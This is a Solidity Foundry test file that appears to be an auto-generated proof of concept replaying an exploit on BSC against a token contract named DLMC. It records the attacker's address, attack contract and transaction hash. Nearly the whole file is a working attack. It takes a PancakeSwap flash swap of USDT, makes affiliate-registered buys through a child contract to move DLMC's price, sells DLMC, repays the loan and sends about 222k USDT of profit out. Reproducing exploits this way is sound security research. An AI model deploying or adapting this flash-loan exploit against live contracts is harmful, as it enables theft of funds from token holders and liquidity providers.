// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x74c4a756933d0f713facb1dea325ef511646c3b1
// Attack Contract : 0xe81bf6e392eca9ad594b5452ea53cf7071760a04
// Vulnerable Contract : 0x0000000000000000000000000000000000000000
// Attack Tx : 0x151025d3f0a782340a74d30ef33a5fad044b838e74437a803f0652e70c231306
// Block : 106091607
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 106091606;
    uint256 constant TX_TIMESTAMP = 1782299710;
    uint256 constant TX_BLOCK_NUMBER = 106091607;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function executeAttack(OurAttack attack) internal {
        bytes memory entryData = abi.encodeWithSelector(bytes4(0x60806040));
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) {
            assembly {
                revert(add(result, 32), mload(result))
            }
        }
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild());
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_701BB7_9699, address(0), Addresses.USDT, "USDT", 222560221693222099016479);
        _expectProfit(Addresses.attack_contract, attack, Addresses.DLMC, "DLMC", 7651708670942671096055);
    }
}

contract OurAttack {
    bytes4 private constant ENTRY_POINT = 0x60806040;
    bytes4 private constant CHILD_BUY_ENTRY = 0xa2608d86;
    bytes32 private constant CALLBACK_ONCE = keccak256("poc.replay.callback");

    AttackChild public attackChild;
    mapping(bytes32 => bool) private callbackDone;

    function attack() public payable {
        IUniswapV2PairLike(Addresses.Cake_LP)
            .swap(
                1420000000000000000000000,
                0,
                address(this),
                hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
    }

    function flashCallback() internal {
        callbackDone[CALLBACK_ONCE] = true;
        flashCallback2();
    }

    function flashCallback2() internal {
        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.A_62CEFE_D792);
        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
        IDLMC(Addresses.DLMC).buy(420000000000000000000000);
        attackChild = new AttackChild();
        attackChild.prepareChild();
        IERC20Like(Addresses.USDT).transfer(address(attackChild), 1000000000000000000000000);
        _callChildBuy(1000000000000000000000000);
        IDLMC(Addresses.DLMC).livePrice();
        IERC20Like(Addresses.DLMC).balanceOf(address(this));
        IERC20Like(Addresses.USDT).balanceOf(Addresses.DLMC);
        uint256 dlmcSellAmount = 65908685295332365480640;
        IDLMC(Addresses.DLMC).sell(dlmcSellAmount);
        uint256 pairRepayment = 1423558897243107769423559;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, pairRepayment);
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        uint256 profitTransfer = 222560221693222099016479;
        IERC20Like(Addresses.USDT).transfer(Addresses.A_701BB7_9699, profitTransfer);
    }

    receive() external payable {}

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        sender;
        amount0;
        amount1;
        data;
        if (!callbackDone[CALLBACK_ONCE]) flashCallback();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == ENTRY_POINT) {
            attack();
            return;
        }
    }

    function _callChildBuy(uint256 buyAmount) internal {
        (bool ok, bytes memory result) = address(attackChild)
            .call(abi.encodeWithSelector(CHILD_BUY_ENTRY, Addresses.DLMC, Addresses.USDT, address(this), buyAmount));
        if (!ok) {
            assembly {
                revert(add(result, 32), mload(result))
            }
        }
    }
}

contract AttackChild {
    bytes4 private constant CHILD_BUY_ENTRY = 0xa2608d86;

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == CHILD_BUY_ENTRY) {
            _buyDlmcWithUsdt();
            return;
        }
    }

    function approveProtocolSpenders() external payable {
        _buyDlmcWithUsdt();
        return;
    }

    function _buyDlmcWithUsdt() internal {
        IDLMC(Addresses.DLMC).registerAffiliate(Addresses.attack_contract);
        IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
        IDLMC(Addresses.DLMC).buy(1000000000000000000000000);
    }

    function prepareChild() public {}
}

library Addresses {
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant A_62CEFE_D792 = 0x62cefE76EEcc737D7ee384eFDbAd8D2C53c1d792;
    address internal constant A_701BB7_9699 = 0x701Bb7B460ae231DBBcFA3d87f0aB5B458429699;
    address internal constant attacker_eoa = 0x74c4A756933D0F713FAcB1DeA325eF511646c3B1;
    address internal constant attack_contract = 0xE81Bf6E392ECa9aD594B5452ea53cF7071760a04;
    address internal constant DLMC = 0xF2ca2A3572B26Ae7c479dC7ae36D922113B1bdF2;
}

interface IDLMC {
    function buy(uint256) external;
    function livePrice() external view returns (uint256);
    function registerAffiliate(address) external;
    function sell(uint256) external;
    function buy() external;
}
